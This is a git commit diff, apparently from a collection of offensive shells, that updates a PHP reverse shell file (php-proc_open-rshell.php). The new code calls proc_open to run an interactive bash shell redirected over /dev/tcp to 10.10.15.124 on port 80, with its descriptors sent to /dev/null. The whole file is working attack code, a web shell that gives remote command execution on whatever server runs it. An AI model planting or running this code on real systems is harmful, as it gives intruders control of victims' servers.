20274913cb9b7ee9985c9fc288881089cb1b32f7
CaptainRoBer <31056150+CaptainRoBer@users.noreply.github.com>
2025-12-05 16:42:16 +0800

    Update php-proc_open-rshell.php

--- shell/php-proc_open-rshell.php
+++ shell/php-proc_open-rshell.php
@@ -1,9 +1,19 @@
 <?php
-$descriptorspec = array(
-0 => array('pipe', 'r'),
-1 => array('pipe', 'w'),
-2 => array('pipe', 'a')
+$cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.124/80 0>&1'";
+
+$descriptorspec = array(
+    0 => array('file', '/dev/null', 'r'),
+    1 => array('file', '/dev/null', 'w'),
+    2 => array('file', '/dev/null', 'w')
 );
-$cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.24/80 0>&1'";
-$process = proc_open($cmd, $descriptorspec, $pipes, null, null);
+
+$process = proc_open($cmd, $descriptorspec, $pipes, null, null);
+
+if (is_resource($process)) {
+    // 关闭所有句柄
+    fclose($pipes[0]);
+    fclose($pipes[1]);
+    fclose($pipes[2]);
+    proc_close($process); 
+}
 ?>
